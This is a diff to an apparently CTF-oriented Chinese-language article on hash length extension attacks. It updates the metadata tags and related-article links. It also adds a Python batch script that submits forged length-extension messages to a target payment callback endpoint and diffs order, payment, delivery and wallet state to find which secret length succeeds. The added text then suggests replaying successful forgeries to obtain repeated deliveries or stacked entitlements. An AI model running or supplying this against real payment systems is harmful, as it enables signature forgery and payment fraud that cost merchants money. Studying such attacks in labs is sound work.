@@ -15,10 +15,10 @@ signals: ["length extension", "长度扩展", "Merkle-Damgard", "hashpumpy", "H(
 mcp_tools: ["http_probe", "kb_router"]
 keywords: ["长度扩展攻击", "hash length extension", "hashpumpy", "MD5扩展", "SHA256扩展", "Merkle-Damgard", "HLE", "Flask签名", "支付签名扩展"]
 difficulty: "advanced"
-tags: ["signature", "crypto", "hash", "length-extension", "md5", "sha256", "web-security"]
+tags: ["signature", "crypto", "hash", "length-extension", "md5", "sha256", "payment"]
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/02-implementation", "ctf-website/12-payment/payment-callback-async"]
+related_articles: ["ctf-website/13-signature/00-overview", "ctf-website/13-signature/02-implementation", "ctf-website/13-signature/04-canonicalization", "ctf-website/13-signature/06-replay-nonce", "ctf-website/12-payment/payment-callback-async", "ctf-website/12-payment/payment-logic"]
 ---
 # Hash Length Extension 攻击 — 深度技术手册
 
@@ -1009,6 +1009,58 @@ def route_hle_result(result):
 | secret length | 1-128 爆破结果、成功长度 |
 | 发送形态 | JSON/form/raw query、重复参数 first/last |
 | 服务端 oracle | `invalid sign`、订单状态、权益、余额、flag |
+
+### 10.1.1 HLE 到支付账本批处理
+
+HLE 成功长度往往不止一个候选，要把每个 forged message 直接跑到账本 diff。核心输出不是 forged sign，而是哪个 secret length 让订单、流水、权益发生变化。
+
+```python
+# hle_payment_ledger_batch.py
+import csv
+import json
+import requests
+
+BASE = "https://target"
+S = requests.Session()
+
+def snapshot(order_id):
+    paths = {
+        "order": f"/api/orders/{order_id}",
+        "payment": f"/api/payment/{order_id}",
+        "delivery": f"/api/orders/{order_id}/delivery",
+        "wallet": "/api/wallet",
+    }
+    out = {}
+    for name, path in paths.items():
+        r = S.get(BASE + path, timeout=8, allow_redirects=False)
+        out[name] = f"{r.status_code}:{len(r.text)}:{r.text[:180].replace(chr(10), ' ')}"
+    return out
+
+def submit_forged(raw_body):
+    return S.post(BASE + "/notify", data=raw_body, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10, allow_redirects=False)
+
+def run_batch(order_id, candidates, out_csv="exports/hle_payment_ledger_batch.csv"):
+    rows = []
+    for item in candidates:
+        before = snapshot(order_id)
+        r = submit_forged(item["forged_message"])
+        after = snapshot(order_id)
+        rows.append({
+            "secret_len": item["secret_len"],
+            "append": item["append"],
+            "forged_sign": item["forged_sign"],
+            "response": f"{r.status_code}:{len(r.text)}:{r.text[:160]}",
+            "before": json.dumps(before, ensure_ascii=False),
+            "after": json.dumps(after, ensure_ascii=False),
+            "changed": before != after,
+        })
+    with open(out_csv, "w", newline="", encoding="utf-8") as f:
+        w = csv.DictWriter(f, fieldnames=list(rows[0]))
+        w.writeheader()
+        w.writerows(rows)
+```
+
+候选生成可以来自 `hashpumpy` 或 `hlextend`。`changed=true` 后立刻把成功样本转到 `06-replay-nonce.md` 做重放/幂等变体，确认是否能多次发货或叠加权益。
 
 ### 10.2 不成立样本
 
